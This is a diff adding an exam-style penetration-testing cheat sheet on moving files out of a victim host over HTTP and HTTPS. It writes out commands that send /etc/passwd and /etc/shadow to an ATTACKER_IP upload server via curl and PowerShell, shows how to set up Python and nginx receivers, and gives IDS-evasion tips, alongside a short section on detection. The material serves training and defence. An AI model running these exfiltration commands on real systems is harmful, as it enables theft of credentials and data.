@@ -531,3 +531,249 @@ openssl enc -aes256 -pbkdf2 -in file -out file.enc
 ```
 
 ---
+
+# 🌐 Catching Files over HTTP & HTTPS — Practical Cheat Sheet
+
+HTTP/HTTPS is the **most reliable file transfer channel** during assessments because:
+
+- ✅ Almost always allowed through firewalls
+    
+- ✅ Blends with normal traffic
+    
+- ✅ HTTPS provides encryption in transit
+    
+- ✅ Easy to stand up temporary servers
+    
+
+---
+
+# 🧠 Core Concept
+
+Victim ➜ Uploads via **PUT / POST**  
+Attacker ➜ Hosts lightweight web server to receive files
+
+---
+
+# 🟢 QUICK METHOD (Fastest Setup) — Python Upload Server
+
+## 🔹 Install Upload Server
+
+```bash
+pip3 install uploadserver
+```
+
+## 🔹 Start HTTP Upload Server
+
+```bash
+python3 -m uploadserver 8000
+```
+
+Upload page available at:
+
+```
+http://ATTACKER_IP:8000/upload
+```
+
+---
+
+## 🔹 Victim Upload (Linux)
+
+```bash
+curl -X POST http://ATTACKER_IP:8000/upload -F 'files=@/etc/passwd'
+```
+
+---
+
+## 🔹 Victim Upload (Windows PowerShell)
+
+```powershell
+(New-Object Net.WebClient).UploadFile("http://ATTACKER_IP:8000/upload","C:\file.txt")
+```
+
+---
+
+# 🔐 HTTPS Secure Upload (Recommended)
+
+## 🔹 Generate Self-Signed Certificate
+
+```bash
+openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+```
+
+## 🔹 Start HTTPS Upload Server
+
+```bash
+python3 -m uploadserver 443 --server-certificate server.pem
+```
+
+## 🔹 Victim Upload (Ignore self-signed warning)
+
+```bash
+curl -X POST https://ATTACKER_IP/upload \
+-F 'files=@/etc/shadow' --insecure
+```
+
+---
+
+# 🟡 NGINX — PUT Upload Server (Clean & Controlled)
+
+Nginx is safer than Apache for uploads because it does NOT execute PHP by default.
+
+---
+
+## 🔹 Create Upload Directory
+
+```bash
+sudo mkdir -p /var/www/uploads/SecretUploadDirectory
+sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
+```
+
+---
+
+## 🔹 Nginx Config File
+
+Create:
+
+```
+/etc/nginx/sites-available/upload.conf
+```
+
+Add:
+
+```nginx
+server {
+    listen 9001;
+
+    location /SecretUploadDirectory/ {
+        root /var/www/uploads;
+        dav_methods PUT;
+    }
+}
+```
+
+---
+
+## 🔹 Enable Site
+
+```bash
+sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
+sudo rm /etc/nginx/sites-enabled/default
+sudo systemctl restart nginx
+```
+
+---
+
+## 🔹 Upload Using PUT
+
+```bash
+curl -T /etc/passwd \
+http://ATTACKER_IP:9001/SecretUploadDirectory/users.txt
+```
+
+---
+
+# 🔍 Troubleshooting
+
+## Port Already in Use
+
+```bash
+ss -lnpt | grep 80
+```
+
+Check logs:
+
+```bash
+tail -f /var/log/nginx/error.log
+```
+
+---
+
+# 📤 Simple HTTP Exfil (No Upload Server)
+
+If victim is a web server:
+
+### On victim:
+
+```bash
+python3 -m http.server 8000
+```
+
+### On attacker:
+
+```bash
+wget http://VICTIM_IP:8000/file.txt
+```
+
+⚠ Inbound traffic may be blocked.
+
+---
+
+# 🛡 Security Considerations
+
+|Risk|Mitigation|
+|---|---|
+|Web shell upload|Disable script execution|
+|Directory listing|Do NOT enable autoindex|
+|Plaintext transfer|Use HTTPS|
+|IDS detection|Use common ports (443)|
+
+---
+
+# 🔎 What Gets Logged (Detection Awareness)
+
+Uploads generate:
+
+```id="2xrk10"
+POST requests
+```
+
+Or:
+
+```
+PUT /SecretUploadDirectory/file.txt HTTP/1.1
+```
+
+Monitor for:
+
+- Unusual user-agent strings
+    
+- Large POST bodies
+    
+- Unexpected PUT methods
+    
+- Outbound HTTPS to unknown IPs
+    
+
+---
+
+# 🔥 Attack Flow Visualization
+
+![Image](https://bitlaunch.io/blog/content/images/2020/08/1.1.png)
+
+![Image](https://decodo.com/cdn-cgi/image/width%3D1280%2Cquality%3D70%2Cformat%3Dauto/https%3A//images.decodo.com/curl_blog_Image_Hero_dfd07d7d5e/curl_blog_Image_Hero_dfd07d7d5e.png)
+
+![Image](https://journaldev.nyc3.cdn.digitaloceanspaces.com/2017/09/python-simplehttpserver-terminal.png)
+
+![Image](https://i.sstatic.net/Edx8g.png)
+
+1. Attacker starts HTTP/S upload server
+    
+2. Victim sends file via PUT/POST
+    
+3. File saved server-side
+    
+4. Logs record HTTP method
+    
+
+---
+
+# 🎯 Exam Key Points
+
+✔ HTTP/HTTPS = most reliable channel  
+✔ Python uploadserver = fastest setup  
+✔ Nginx PUT = controlled upload method  
+✔ HTTPS preferred for sensitive data  
+✔ Monitor for abnormal PUT/POST traffic  
+✔ Disable directory listing
+
+---
